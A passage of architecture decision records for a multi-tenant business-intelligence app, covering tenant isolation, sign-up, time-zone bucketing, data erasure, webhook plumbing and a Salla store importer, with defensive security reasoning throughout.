   `CurrentBusiness` is a scoped instance, so a worker starts every request and job with no
   business.
5. **Reads are scoped by a global scope (`ScopedToBusiness`), and it fails closed.** A query
   on owned data with no business in context throws `MissingBusinessContext`. It never
   returns an empty list, and never every business's rows. Another business's record is a
   404, not a 403 that would confirm it exists.
6. **Users carry the column but not the scope.** The guard must find a user by email before
   any business is known. User management is scoped explicitly.
7. **The audit log may hold a row with no business.** A failed sign-in for an address that
   matches no account belongs to nobody. An attack on a real account is filed under that
   account's business, where its owner can see it.
8. **Settings are one row per business.** `CHECK (id = 1)` becomes UNIQUE(business_id), and
   `BusinessSetting::current()` is cached per business.

**Migration.** An existing installation is moved into one business named after its settings.
A fresh database invents none. The migration was gated on a copy of the development
database: migrate, roll back, migrate. At every step the row counts of all 14 tables and the
money sums (order totals, payments, refunds, line totals, expenses, stock) were identical.
The rollback refuses to run when more than one business exists, because it would merge
their data.

**The doors a model scope does not cover (P2 phase 2).**

- **Raw aggregates.** The metric, tax and inventory queries use the query builder for speed,
  and the query builder knows nothing of global scopes. All 25 now start at
  `TenantQuery::table()`, which adds the business filter. That includes the two subqueries
  that grouped across the whole table: first orders per customer, and the stock ledger
  totals.
- **Validation.** `TenantRule::exists()` and `TenantRule::unique()` look only inside the
  business. Another business's customer or product id is refused with a 422, where it would
  otherwise pass validation and be written onto this business's order.
- **Users.** Users are scoped like every other model. The sign-in provider
  (`BusinessAgnosticUserProvider`) is the single exemption, because it must find a user by
  email before any business is known. With the scope, the last-owner guard counts owners in
  one business, and `/users/{id}` for another business's user is a 404.
- **Per-business sequences and caches.** Order numbers restart per business. The
  calculator's per-request aggregate cache is keyed by business.
- **The currency on screen.** `/me` now carries the business's name and currency, and the
  frontend takes its money defaults from it. Until then, every screen that did not pass a
  currency showed BHD. The two-business browser test found this, and it predates tenancy: a
  single Kuwaiti business would have seen BHD too.

**Proof** (`tests/Feature/Tenancy/TenantIsolationTest.php`). Each test was run against the
code before this step and failed, then passed after it:

- **Every route with a record in its URL** is read from the route table. As another
  business's owner it answers 404, and the target is untouched afterwards. A new kind of
  route parameter fails the test until it is mapped.
- **Every list, export and analytics endpoint** is checked the same way. The other
  business's names carry a marker, and no response may contain it.
- **The first business's figures** — summary, series, breakdowns, VAT, dashboard and
  insights — are compared before and after a second business is filled with the same
  fixture on the same dates. They must be identical.
- **A source scan** fails on any `DB::table()` in `app/` outside the tenancy layer.
- **In the browser**, `e2e/tenancy.spec.js` runs against the seeded second business (Al Noor
  Trading, KWD, `owner@alnoor.test`):
  - each owner sees only their own business, in their own currency;
  - a link to the other business's order reads "Resource not found".

**Cost accepted.** Every new business-owned table needs the column and the trait, and every
new raw query needs the business filter. The phase 2 tests exist to make forgetting either
fail loudly.

## ADR-024 — A business signs itself up, then answers four questions

**Status:** Accepted (2026-09)
**Affects:** `businesses`, auth routes, `/me`, the sign-in screen, a new setup wizard, the
products screen

**Context.** With tenancy in place (ADR-023) the installation can hold many businesses, but
there was no way to create one: a business had to be inserted by hand. Selling a
subscription means a stranger can start on their own.

**Decision.**

1. **One transaction creates everything** (`RegisterBusiness`): the business, its settings,
   its owner, and the expense categories a business needs before it can record a cost, named
   in the owner's language. A failure anywhere leaves nothing behind — no business without an
   owner, no owner without a business. A test proves it by making the last step throw.
2. **The owner is signed in by the response**, as after sign-in, so there is no second trip
   through the login form.
3. **Rate-limited to five an hour per address.** Each call creates a business.
4. **Email stays unique across the installation**, because signing in is by email. That means
   sign-up does tell a caller whether an address is registered — accepted, as on every
   sign-up form, and bounded by the limiter. Sign-in still refuses to distinguish an unknown
   address from a wrong password.
5. **A four-question wizard, not a form of forty fields.** Where the business trades → VAT →
   the weekend → what to do first. The country fills in currency, decimal places, time zone,
   week start, weekend and a suggested VAT rate; every one of them is SHOWN before it is
   saved and can be changed. Nothing is inferred from the browser: a laptop bought abroad
   carries the wrong locale, and a wrong currency is a wrong figure on every screen
   afterwards.
6. **Rates are offered, never asserted.** The wizard fills in the standard rate for the
   country and says to check the current one with the tax authority — rates change, and the
   market study's figures carry an "as of" date.
7. **Each step saves as it is left**, so a closed tab loses nothing, and `onboarded_at`
   records that setup finished. Until it is set, an owner signing in is brought back to the
   wizard; nobody else is, since only an owner can change settings.
8. **The catalogue got a create form.** Until now products could only be added by the seeder
   or a direct API call, which is fine for a demo and impossible for a business that has just
   signed up: with no product there is no order, and with no order there is no figure
   anywhere.

**Proof.** `tests/Feature/Tenancy/RegistrationTest.php` covers the transaction, the duplicate
address, the password policy, the limiter, the wizard's last step and who may finish it, and
that a new business starts genuinely empty. `e2e/onboarding.spec.js` walks the whole path in
a browser — sign-up, the four questions with Kuwait chosen, an empty catalogue, a first
product, a first order — and reads the resulting figure back as `KWD 25.000`: the currency
the wizard chose, at its three decimal places.

**Cost accepted.** Sign-up is slow by design (a hash, and the breach-corpus check the
password policy has always made). The browser test waits for it rather than working around
it.

**Not done here.** No email verification, no password reset, no subscription or billing, and
no importing an existing store — the wizard says so rather than implying it exists.

## ADR-025 — Time-series buckets are cut in PHP, not in SQL

**Status:** Accepted (2026-09)
**Affects:** `app/Domain/Metrics/TimeSeries.php`

**Context.** A daily, weekly or monthly series has to group orders by the business's own
calendar day, and `placed_at` is stored in UTC. The query therefore has to know where each
local day begins. It used to work that out itself:

```sql
CONVERT_TZ(placed_at, '+00:00', '+03:00')
```

MySQL's `CONVERT_TZ` accepts either a named zone or a fixed offset. **A named zone returns
`NULL` unless the server's `mysql.time_zone` tables have been loaded** — they are empty on a
stock XAMPP install and on the CI image — so every bucket would come back empty, reported as
a legitimate zero. The offset always works, but there is only one of it: the offset in force
on the day the report is run, applied to the whole history.

For every Gulf zone that is exactly right, because none of them change their clocks. For a
zone that does, every bucket on the far side of the change is an hour out. And the failure
is worse than a misplaced label: `emptyBuckets()` builds the PHP keys from the real named
zone, so a shifted SQL key matches no PHP key and the row falls through `?? zeroFor()`. A
day's trade silently reads as zero, and only for orders placed near local midnight.

**Decision.** The boundaries are computed **once**, in PHP, where the named zone is always
available and `Period` already does the same arithmetic correctly. The query is handed the
resulting edges:

```sql
CASE WHEN placed_at < ? THEN ? WHEN placed_at < ? THEN ? … END
```

— ascending, first match wins, one pair of bindings per bucket, `bucket_end + 1 day` at
midnight in the business zone as the exclusive edge. The keys the query returns are by
construction the keys `emptyBuckets()` produced, so the two cannot disagree. `CONVERT_TZ`,
`WEEKDAY()` and the offset helper are gone, and with them the class of bug ADR-020 fixed
once already from the other direction.

**Rejected: a named zone plus a setup step.** `CONVERT_TZ(placed_at, 'UTC', 'Europe/Berlin')`
is the correct SQL, and it would have cost one line. It was rejected because it makes every
figure in the product depend on a database that has been provisioned with timezone tables,
and gets it wrong **silently** on one that has not — the worst possible failure mode for a
BI tool, and one that would have hit this project's own development and CI databases first.

**Cost accepted.** The bucket count is bounded by the period cap (1096 days) and the grain,
so the CASE is at most ~1,100 branches. Measured against the development database (2,277
orders):

| Range | Buckets | Before | After |
| --- | --- | --- | --- |
| 30 days, daily (the dashboard's own request) | 31 | 2.8 ms | 4.2 ms |
| 6 months, weekly | 27 | 2.8 ms | 4.9 ms |
| 3 years, daily (only if explicitly asked for) | 1,096 | 27 ms | 248 ms |

A millisecond and a half on the request the product actually makes, in exchange for buckets
that are right everywhere. The pathological case is a quarter of a second and reachable only
by asking for a grain the auto-selection would never choose.

## ADR-026 — Erasure by anonymisation, and a retention window per business

**Status:** Accepted (2026-10)
**Affects:** `activity_logs`, `customers`, `business_settings`, a new
`app/Domain/Compliance/`, the first scheduled command, the settings and customer screens,
a public privacy page

**Context.** Selling to Saudi customers means answering PDPL questions the product had no
answer for: how long is the audit log kept, how does a person get a
copy of what is held about them, and how do they get it removed. The honest answers were
"for ever", "they cannot" and "they cannot". The audit log's own documentation said
*"Retention: indefinite in the MVP"*, and SECURITY.md promised the table was append-only.

**Decision.**

1. **Retention is a per-business setting, enforced nightly.**
   `business_settings.activity_retention_days`, 730 by default, constrained 30–3,650 in
   both the database and the request. `opsight:prune-activity` runs each business inside
   its own tenant context, then sweeps rows belonging to no business at the longest window
   any business configured — without that sweep they would never be pruned at all, because
   `BusinessScope` hides them from every per-business pass.

   The floor is not arbitrary. A retention window shorter than an investigation is not a
   policy, and the only person it serves is the one being audited.

2. **Erasure anonymises; it does not delete.** Every revenue, cost, tax and
   customer-growth figure is computed from orders, so removing them would not protect the
   person — it would silently restate the business's own history. `deleted_at` stays NULL
   for the same reason: `MetricCalculator::dormantCustomerCount()` and `QuickStats` both
   read it, so a soft delete moves the dashboard. The person's columns are overwritten in
   place and `erased_at` is set.

   A test holds `MetricSummary` byte-identical across an erasure. Because no summary
   metric reads the customers table, that is nearly true by construction — so it is paired
   with a control proving a soft delete of the same customer DOES move the figures.
   Without the control the first test would pass whatever the code did.

3. **The scrub replaces values and keeps keys — the inverse of `AuditRedactor`.** There,
   the key's presence is the leak: `"password": "[redacted]"` still says a password was in
   scope. Here the key's presence is the surviving auditable fact. "Someone changed this
   customer's email in March" must stay true after the erasure; only the address goes.
   Dropping the key would erase the accountability along with the data.

4. **The value sweep is best-effort, and excludes the name.** Personal data also sits in
   rows with no subject id — most realistically the search term recorded in an
   `export.generated` entry's filters. A `LIKE` sweep finds those by email, phone, tax
   number and address. It deliberately does not sweep for the name: a customer called
   "Ali" would have that substring struck out of "Alia Trading" in other people's rows.
   The targeted pass already covers every row naming this customer, so a bounded, stated
   gap was judged a smaller harm than corrupting unrelated history.

5. **The export reuses `customers.export`, with one correction.** The dossier is a strict
   subset of what the list export plus the order history already release to the same
   roles. But an Analyst holds `customers.export` and NOT `activity.view`, so the audit
   section is omitted for a reader without it — omitted, not emptied.

6. **`customers.erase` is Owner-only, and is the opposite case to `customers.delete`.**
   The soft delete is refused for a customer with committed orders; erasure exists for
   precisely that customer. A Manager may hide a customer; only the Owner may forget one.

**Rejected: deleting the person's orders.** It is what "erasure" sounds like it should
mean, and it is the one option that would make the product's numbers lie. Stated here
because it will be proposed again.

**Rejected: dropping the keys in the audit log.** Consistent with `AuditRedactor` and
wrong for the same reason it is right there — see decision 3.

**Costs accepted.**

- **`activity_logs` is no longer append-only**, and SECURITY.md §10 now says so, with the
  hardened grant split: `INSERT, SELECT` for the web user, `DELETE, UPDATE` additionally
  for the scheduler's account. A promise the code no longer keeps is worse than no
  promise.
- **The value sweep is an unindexable `LIKE` scan over the fastest-growing table**, run
  synchronously inside a request. Accepted because an erasure is a rare, human-initiated
  act. It is, however, the first operation in this system whose cost is not bounded by a
  filter — so **ADR-011's revisit trigger ("the first real background job") is now in
  sight**, and this is the operation that will cross it.
- **The breakdown's customer label changes** after an erasure while its value does not.
  Correct, and named so it is not filed as a bug.
- **The erasure's own audit row must suppress the observer.** `AuditRecorder::diff()`
  builds `before` from `getRawOriginal()`, so the obvious `$customer->update([…])` writes
  the name, email and address straight back into the table being scrubbed, in the same
  transaction. The service uses `withoutAudit()` and records by hand with `changes: null`
  — the second sanctioned use of that escape hatch, and a test holds it.
- **The scheduler needs one real cron entry** (`* * * * * php artisan schedule:run`).
  Without it nothing errors; the log simply keeps growing. Recorded in SETUP.md.

**A correction worth keeping.** The plan for this phase asserted that a command in
`app/Console/Commands/` would not be registered, because `withRouting(commands: …)` files
the path under `commandRoutePaths`. That is true and irrelevant:
`Application::configure()` already calls `withCommands()` with no arguments, which
defaults to scanning `app/Console/Commands`. Reading a function is not running it.

## ADR-027 — Integration plumbing, and the first queued job

**Status:** Accepted (2026-10)
**Affects:** `integrations`, `webhook_receipts`, `source`/`external_id` on products,
customers and orders, a new `app/Jobs/`, `config/integrations.php`, one public route
**Supersedes in part:** ADR-011 (no queued jobs)

**Context.** The Salla importer and the WhatsApp alerts are the two things P2 is for, and
both need the same four things underneath: somewhere to keep a connected account's tokens,
a way to receive a provider's webhooks without being fooled by a forged one, a way to not
create the same order twice, and a way to do work outside a request. Building those once,
before either integration, is cheaper than building them twice inside each.

This phase deliberately ships **no provider**. Salla's signature header, event names and
payload shapes are read from Salla's current documentation when the importer is built, not
guessed at now — a contract shaped around an imagined provider is one the real provider
then has to be bent into.

**Decision.**

1. **Tokens are encrypted by a cast, not by the column.** `integrations.access_token` and
   `refresh_token` are `encrypted`, so the database holds ciphertext. The threat is a copy
   of the data leaving the server; a refresh token is a standing grant to read a
   business's whole order history. The tests assert against the **raw column**, because
   asserting through the model would decrypt and prove nothing. Both are `$hidden`, so a
   carelessly written resource cannot serialise them.

   **The cost is `APP_KEY`.** Rotating it without re-encrypting disconnects every
   integration. That is the right way round: a lost connection is a reconnection, a leaked
   refresh token is somebody else reading the business's books.

2. **`source` and `external_id` land now, empty.** They are what makes importing
   idempotent — re-importing an order must update the row it made last time. Unique on
   `(business_id, source, external_id)`, so two businesses may both import the provider's
   order "1001", one business may import "1001" from two providers, and every manually
   entered row is exempt because NULLs do not collide. Added later, they would have to be
   reconciled against the duplicates the first run already made.

3. **Every delivery is stored before it is believed, and answered before it is handled.**
   Unknown provider → 404, so there is no endpoint accepting payloads nothing can verify.
   Oversized body → 413, because the body is the one thing an unauthenticated caller
   controls before any check runs. Bad signature → stored, then 401: that row is how an
   operator tells a rotated secret from someone probing. Good signature → stored under the
   provider's own event id, 202, and a job.

   A duplicate event id is answered 202 "duplicate" and goes no further. Both a lookup and
   a unique index, because only the index cannot lose a race.

4. **`WebhookReceipt` carries neither tenancy trait — the only model that does not.**
   `ScopedToBusiness` would hide the rejected deliveries an operator most needs to see.
   `BelongsToBusiness` is the interesting one: it fills `business_id` from whatever
   business is in context, which is right everywhere else and wrong here, because a
   delivery's owner must come from the payload that was just verified rather than from
   ambient state. A test caught it filing an unverified delivery under a real business.

5. **A job carries its business, and a middleware restores it.** `CurrentBusiness` is
   container-scoped and Laravel flushes scoped instances between jobs, so inheriting the
   previous job's business "should" not happen. Should is not something anyone can act on,
   so `WithBusinessContext` sets it explicitly, restores the caller's context afterwards
   however the job ends, and **throws when a job names no business** — a job must never
   run for everyone. Jobs carry ids, not models: `SerializesModels` re-fetches through the
   global scope with no business in context, and the row would come back missing.

6. **The stock policy for imported orders, decided here and implemented with the
   importer.** When a store is the system of record, it has already decremented its own
   stock; an importer that also decrements produces an order whose stock moved twice.
   So the importer **does not move stock for an imported order**. Quantities are synced
   from the store as a distinct movement reason, `source_sync`, which keeps the ledger
   invariant (every change has a row explaining it) without claiming a sale happened here.

   The enum value lands with the code that writes it, not now: a reason nothing can
   produce is dead weight in a schema.

**Rejected: a generic "integration" abstraction with adapters for everything.** Two
providers that do genuinely different things — importing a store and sending a message —
share a token store and nothing else. The webhook contract covers what they do share.

**Rejected: handling the delivery inside the request.** It is the shortest path to the
duplicate this whole design exists to prevent: the provider times out, retries, and now
there are two orders.

**Costs accepted.**

- **ADR-011 is now partly superseded.** That decision said the MVP has no queued jobs and
  named "the first real background job" as its revisit trigger. ADR-026 said the trigger
  was in sight; this is it. Deployment now needs a worker (`queue:work`) as well as the
  scheduler's cron, both recorded in SETUP.md. **A deployment that forgets the worker
  fails silently in the worst way: the endpoint keeps answering 202, because receiving did
  succeed, and nothing is ever handled.** The integration dashboard in Phase 6 shows
  unprocessed receipts for exactly that reason.
- **`external_event_id` is unique across providers, not per provider.** A collision
  between two providers' id schemes would reject a genuine delivery. That is the safe
  direction to fail, and the column carries the provider's own namespace in practice.
- **An unmatched delivery is kept and not queued.** Genuine, verified, for a store we
  cannot place — most likely one that disconnected mid-flight. Failing a job four times
  would say nothing the row does not.
- **No provider ships**, so none of this is exercised in production until Phase 6. The
  tests run against a fake that signs with HMAC-SHA256, which is what both Salla and Meta
  use — a fake shaped like the real thing, rather than a mock that returns true.

## ADR-028 — Salla: a store arrives before it has an owner, and claims are weak on purpose

**Status:** Accepted (2026-10)
**Affects:** `app/Domain/Integrations/Salla/*`, `unclaimed_integrations`, `ClaimStore`,
`WebhookProvider::acceptsUnmatched`, `ProcessUnclaimedDelivery`, `IntegrationController`,
`integrations.manage`, `opsight:salla:reconcile`, `opsight:prune-unclaimed-integrations`
**Builds on:** ADR-027 (integration plumbing)

**Context.** ADR-027 shipped the plumbing and deliberately no provider, so that Salla's
signature header, event names and payload shapes would be read from Salla's documentation
rather than guessed. Reading it was the right call and more necessary than expected: the
documentation contradicts itself in three places that each change the code.

- The webhook signature is described in prose as "the request body's SHA256 hash" — a value
  any caller could compute, which would authenticate nothing — while the code samples on the
  same page use `hash_hmac` with the secret. The samples are right.
- The install event is spelt `app.store.authorize` in one place and `app.store.authorized`
  in another.
- The access token's lifetime arrives as `expires` in the install payload and `expires_in`
  in the refresh response, and the same page calls the value a unix timestamp in one
  sentence and seconds in the next. Its own example, `1209599`, is plainly a duration.

Two mistakes in Salla's own samples are not copied: the PHP one compares signatures with
`===`, which leaks a signature one byte at a time to anyone willing to measure, and the Node
one omits `return` after sending 401, so it answers 200 to a forged delivery as well.

**Decision.**

1. **Easy mode, not Custom mode.** Salla's documentation states that Easy mode is the only
   method allowed for published App Store apps and that Custom mode is for testing. Building
   against the mode that cannot ship would mean rewriting the connection layer on the day of
   publication. The cost is paid immediately: Easy mode delivers tokens by webhook, so a
   public tunnel is needed from the first live test rather than at the end.

2. **A store can exist before a business owns it, in a table of its own.** Easy mode's
   install delivery carries the tokens and nothing identifying the business it belongs to
   here — no state parameter, no query string on the install URL, no redirect back. The only
   source of the store's identity is an API call made with the token it just sent. So for up
   to an hour a real connection exists that belongs to nobody.

   It does not go in `integrations`. That table's `business_id` is NOT NULL, and that is what
   makes every read of it safe; loosening it so one row could be ownerless would weaken the
   guarantee for every other row, to model a state meant to last minutes.
   `unclaimed_integrations` has no `business_id` at all — the same reasoning that left
   `webhook_receipts` carrying neither tenancy trait — and is never read as though it were a
   connection.

3. **The contract gains `acceptsUnmatched($event)`.** `businessIdFor()` matches a delivery
   against a connection that the install event is what *creates*, so it returns null and the
   door discarded the one delivery that starts an integration. The new method asks about the
   event name, not the payload, so a provider answers without trusting anything the delivery
   claims; a provider that says false behaves exactly as before. The alternative — letting
   every unmatched delivery through and having handlers sort it out — makes the door's job
   ambiguous for the sake of one event.

4. **Those deliveries run in a job with no business context, not in a job that tolerates
   one.** `WithBusinessContext` refuses a job with no business because a job that ran "for
   everyone" would read across the whole installation. The shortcut was to make it tolerate
   null. `ProcessUnclaimedDelivery` is a separate job instead — one whose handler may only
   touch rows that belong to nobody either — rather than a hole in a rule that protects every
   other queued job.

5. **The claim is weak, and the weakness is bounded rather than denied.** The merchant
   tells us which store is theirs with the store id Salla shows them. A store id is an
   identifier, not a secret. What makes it acceptable is the size of the opening:

   - claimable only for the hour after install, swept hourly so the window is a fact and not
     a rule;
   - claimable once, because the pending row is deleted in the same transaction that creates
     the connection, so the tokens exist in exactly one place at every moment;
   - a store already connected cannot be taken by naming it — the one thing this must never
     allow;
   - the claimer is a signed-in Owner, rate limited to ten attempts an hour, and every
     attempt is audited whether it succeeds or fails. A run of failures from one account is
     somebody trying store ids, and that row is the only place it shows;
   - all three refusals — absent, expired, taken — answer identically, because telling an
     owner which ids exist or which are taken turns the claim into a way to enumerate other
     people's shops;
   - disconnecting is no harder to reach than claiming was, takes the tokens with it, and
     frees the store to be claimed by its real owner.

   **Rejected: matching the merchant's email against the owner's.** It reads as stronger and
   is not — an authorisation decision made on an unverified string — and it fails for the
   ordinary case of a merchant whose Salla account uses a different address.

   **Residual risk, stated plainly:** inside that hour, someone who learns another merchant's
   store id and is an Owner on this installation could claim it. The store's name is shown
   back on the screen immediately so a wrong claim is visible rather than discovered later,
   and the audit row names who did it. A stronger binding needs something Salla does not
   currently offer; if it ever does, this is the decision to revisit.

6. **The refresh token is single use, so the lock is not an optimisation.** Salla's
   documentation is explicit: each refresh invalidates the previous refresh token, and using
   one twice invalidates the access tokens too and forces the merchant to reinstall the app,
   with no recovery an operator can perform. Salla itself recommends a mutex. `SallaOAuth`
   takes a lock per connection **and re-reads the row inside it**: the second caller is a job
   holding a copy loaded before the first one wrote, and the right thing for it to do is
   nothing. A 4xx is final rather than retried, because asking again with a dead token is how
   one bad refresh becomes four; a 5xx leaves the connection alone, because an outage must
   not become a reinstall for every merchant.

7. **Reconciliation may never report a false all-clear.** An importer that drops one order
   in fifty does not fail — it produces figures that are plausible, slightly low and wrong,
   and nothing else in this system would notice. `opsight:salla:reconcile` is the only thing
   that would, so every shape it cannot read is an error rather than a zero: a missing `data`
   array, a missing pagination block, an unreadable order total, an unreachable API. It exits
   non-zero on any difference so a cron is an alarm rather than a log, and counts only orders
   whose `source` is Salla so a business that also sells by hand does not learn to ignore it.

**Consequences.**

- Unclaimed tokens are discarded after an hour. A merchant who misses the window reinstalls,
  which costs them a minute; the alternative is a live key to someone's shop sitting in a
  table nothing reads.
- `SALLA_CLIENT_ID` and `SALLA_CLIENT_SECRET` are deployment secrets. Without them a
  connection cannot be refreshed and dies after a fortnight — which the connection screen
  states as "will stop in a fortnight", rather than leaving it to be discovered.
- Salla only issues a refresh token when the app requests the `offline_access` scope. An app
  registered without it produces connections that cannot survive two weeks, and the screen
  says so per connection.
- **The List Orders query parameters (`from_date`, `to_date`, `page`, `per_page`) and the
  pagination fields are the one part of this integration not read from a sentence Salla
  wrote** — its own List Orders page did not render, so they come from the published OpenAPI
  description. They are gathered in `SallaClient` so the first live run has one place to
  correct. The reconciler fails loudly rather than guessing if the response does not match.

## ADR-029 — The importer trusts Salla's totals, and refuses what it cannot read

**Status:** Accepted (2026-10)
**Affects:** `SallaMap`, `ImportSallaOrder`, `SallaWebhooks::handle`,
`opsight:salla:import`
**Builds on:** ADR-027 (integration plumbing), ADR-028 (the Salla connection)

**Context.** ADR-028 built the connection and deliberately stopped there: the handler
verified every delivery correctly and then threw `No importer handles '{event}' yet`. A
merchant could connect their store and see nothing. This is the other half.

**Decision.**

1. **The status map is where this integration is most able to lie, so it is a file of its
   own.** Salla's statuses were read from its List Order Statuses page, not inferred from a
   test store: `payment_pending`, `waiting_for_payment_confirmation`, `payment_failed`,
   `in_progress`, `under_review`, `completed`, `delivering`, `delivered`, `shipped`,
   `canceled`, `restored`, `restoring`.

   **The line is "has the merchant committed?", not "has the money arrived".** Baydar books
   a confirmed order as revenue and tracks what is owed separately (ADR-022) — the same thing
   it does for a hand-typed order with cash due on delivery — so an unpaid order is
   confirmed-and-unpaid rather than invisible. The exception is the three states where the
   merchant has not committed at all: a basket awaiting payment, one awaiting confirmation,
   and one whose payment failed. Those are drafts, which count toward nothing.

   Booking them as revenue would be **the most flattering mistake an importer can make, and
   the hardest to notice, because the figures only ever look better.**

   Note `canceled`, with one L. A typo there would file cancellations as sales.

2. **An unknown status throws; an unknown payment method does not.** A merchant can define
   custom statuses, and defaulting one would file real orders under whatever the default
   happened to be — so the delivery is kept with the reason on it, which is a question
   someone can answer in a minute. A payment method is a label on money that has already
   changed hands: refusing the order because the wallet is unfamiliar would lose a real sale
   over a word, so it becomes `other` and Salla's own word is kept in the payment's
   reference.

3. **Salla's totals are written as they arrived, not recomputed from the lines.** This looks
   lazy and is the opposite. `opsight:salla:reconcile` exists to catch an importer that drops
   one order in fifty — the failure that produces figures which are plausible, slightly low
   and wrong. If the importer recalculated the totals, that reconciliation would be our
   arithmetic compared against itself, and would never find anything.

4. **It does not move stock, and does not go through `ConfirmOrder`.** The store is the
   system of record for its own shelves and has already decremented them (ADR-027).
   `ConfirmOrder` exists to price an order from the local catalogue and move stock, and both
   are wrong for a record that arrives already priced. The ledger keeps its invariant because
   nothing is claimed to have moved.

5. **Idempotent on `(source, external_id)`, and it does not skip what it has seen.** Salla
   retries, an order changes through its life, and a backfill covers ground a webhook already
   covered — so every row is found before it is written. Re-reading an order is cheap;
   skipping would mean an order edited in Salla after its first import stayed wrong here for
   ever.

6. **An erased customer is never repopulated.** An import that wrote the name back would undo
   an erasure silently, on a schedule (ADR-026). The import updates the order and leaves the
   person as they were left.

7. **Cost is zero, and that is honest rather than lazy.** Salla's order payload carries no
   cost, so margin on imported orders is unknown until the owner prices the products. A
   guessed cost would produce a margin figure that looks authoritative and is invented.

   **Superseded in part by ADR-030.** Salla holds the cost on the PRODUCT, as `cost_price`,
   and the catalogue is now imported before the orders so the line can snapshot it. The
   reasoning above still holds for a product the catalogue pass has not reached.

**Consequences.**

- **Imported orders have no margin** until their products are given a cost here. The figures
  that depend on cost are therefore understated for a store that has only ever imported,
  which is visible rather than hidden: the products show a cost of zero.
- **A custom order status stops that order importing** until it is mapped. The receipt names
  the status and the order, and the rest of the store keeps importing.
- **An order's lines are replaced wholesale on every import.** Safe only because an imported
  order is never edited here — the store owns it.
- **The backfill is a manual command**, not a step in the connection flow. A merchant with
  three years of history should choose when to pull it, and the reconciler is how they check
  it arrived.

**A test-harness trap worth recording.** `Http::fake()` MERGES stubs rather than replacing
them, and matches in registration order — so calling it twice in one test leaves the first
stub in front, and an `Http::sequence` registered there is already exhausted when the second
run reaches it. Two tests failed in a way that looked exactly like the importer duplicating
work. The suite now registers one stub that answers from the request's own `page` parameter,
which also makes the pagination test prove something: that the client asks for the pages it
says it does.

## ADR-030 — The catalogue is imported first, because an order cannot carry a cost

**Status:** Accepted (2026-10)
**Affects:** `ImportSallaProduct`, `ImportSallaOrder`, `opsight:salla:import`
**Builds on:** ADR-029 (the order importer)

**Context.** ADR-029 shipped the order importer and accepted, explicitly, that imported
orders would have no margin: *"Salla's order payload carries no cost, so margin on imported
orders is unknown until the owner fills it in."* That was honest and it was not good enough.
A merchant who connects their store sees revenue with a hole where the gross profit should
be — in a product whose name is "business intelligence".

Salla does hold it. `cost_price` sits on the **product**, not on the order, and it is a
plain number rather than the `{amount, currency}` shape its prices use. Reading it therefore
needs the Products API, which is why this is a pass of its own rather than something the
order importer could do from a webhook payload.

**Decision.**

1. **`opsight:salla:import` walks the catalogue before the orders, and the order is the
   whole point.** A product first seen through an order line is created at cost zero;
   importing the catalogue first means every product an order mentions already has its
   cost. Doing it the other way round would make the catalogue pass a correction rather
   than a prevention, and corrections are the things that do not get run.

2. **A cost Salla does not have never overwrites one the owner typed.** `cost_price` is
   optional at Salla's end, and a merchant who has not filled it in sends null, zero or an
   empty string. Writing that over a cost an owner had entered here would silently erase the
   margin on exactly the products they had already priced — the harm this ADR exists to
   undo, inflicted by the fix for it.

   Zero is read as absent rather than free. Salla's field defaults to nothing, so a zero is
   overwhelmingly "not filled in"; and the cost of guessing wrong the other way is a margin
   of a hundred percent on a figure an owner will act on.

3. **The line snapshots the product's cost at import, and the order's COGS is summed from
   the lines.** Every other order in the system snapshots cost onto its lines at confirm
   time, and an imported order is no different. **It is the one total not taken from Salla**
   — Salla does not report a cost of goods — which is stated here because ADR-029's rule is
   otherwise "write what arrived".

4. **An unpriced product gives an unknown margin, not a total one.** Zero cost reads as "we
   do not know yet", and a re-import once the catalogue has caught up fills it in — which
   works because both importers are idempotent and neither skips what it has already seen.

**Rejected: fetching each product inline while importing an order.** It would close the gap
at the moment it opens, and it would put an HTTP call inside the webhook path — a page of
orders becoming a page of API calls, each able to fail, inside a job the provider is waiting
on. The order importer stays a pure function of its payload, which is also what lets it be
tested without a network.

**Rejected: a screen asking the owner to price imported products.** It was the fallback if
Salla had no cost field. It does, and asking someone to type what we can fetch is work we
invented for them.

**Consequences.**

- **A product first seen through a webhook still has no cost** until the next catalogue
  pass. Its orders carry a zero COGS in the meantime, and re-importing them afterwards
  corrects it. A scheduled catalogue sync would close that window and is not built.
- **`--skip-products`** exists for a store whose catalogue is managed here rather than at
  Salla, where the fetched cost would be the wrong one.
- **The catalogue pass is a full walk every time**, not a delta. Salla's product list has no
  "changed since" filter in the endpoint this uses, and a few hundred products is a handful
  of pages.

## ADR-031 — Motion plays the layout; a keyboard layer, in one listener

**Status:** Accepted (2026-10)
**Affects:** `hooks/useFlip.js`, `hooks/useShortcuts.js`, `AppShell`, `KpiPanel`, `GlobalSearch`
**Amends:** `UI_UX_DIRECTION.md` §2, §5 and §7

**Context.** The dashboard's craft pass found three things, and only one of them was missing
code.

The first: the application already fetched four time series — `orders_trend`, `aov_trend`,
`profit_trend`, `margin_trend` — built them into a `trends` object on the dashboard page, and
never read it. `components/charts/Sparkline.jsx` existed in full, with its own CSS reveal
animation and a matching set of `--spark-*` tokens, and had **zero importers**. `KpiPanel`'s
own docblock promised "the period's shape as a sparkline", and its loading skeleton reserved
a 40px band for one. Four payloads crossed the network on every dashboard load and were
dropped on the floor.

The second: of GSAP, only the core was imported. GSAP is now free in full, and `Flip.js`
ships inside the `gsap` package already in `package.json` — so the plugin that animates
between two real layouts was installed, paid for, and unused.

The third: the design document had drifted from the code. §2 banned "counting-up numbers"
while `CountUp` shipped on four cards; §2 banned radii of 12px and above while §4 defined —
and the code used — a 16px card. A document that contradicts the product is worse than no
document, because it is still cited.

**Decision.**

1. **Flip is allowed, behind one hook, for layout changes only.** `useFlip` carries
   `useGsap`'s three rules — reduced motion runs nothing, everything reverts, scoped to a
   ref — plus a fourth it needs: **the caller captures before React commits**, because every
   React effect runs after the DOM has already changed and the "before" is gone by then.

   `capture()` takes no dependency list. It records the layout and schedules its own render,
   so the hook never has to be told which state can move the page. A hook that took
   `[collapsed]` would be wrong the first time someone added a fourth thing that moves — and
   it could not have animated focus mode at all, whose state lives outside React in
   `localStorage` behind `useSyncExternalStore`.

   Three uses, and the test for each is the same: **is the page a different shape
   afterwards?** Folding the sidebar, entering focus mode, opening a KPI card. Not hover,
   not arrival, not a refetch.

2. **Counting up survives, narrowly, and the ban is rewritten rather than ignored.** Four
   figures, on first load, 900ms, with the final value given to assistive technology
   throughout. It does not run on a refetch, which is the case the original rule was really
   about: a figure that changed because the period changed must not be disguised by one
   arriving.

3. **The sparkline is wired, and stays decorative.** It is `aria-hidden`, it adds shape
   rather than fact, and every number it hints at is already on the card. A sparkline that
   were the only place a fact appeared would break the rule that a chart is never the only
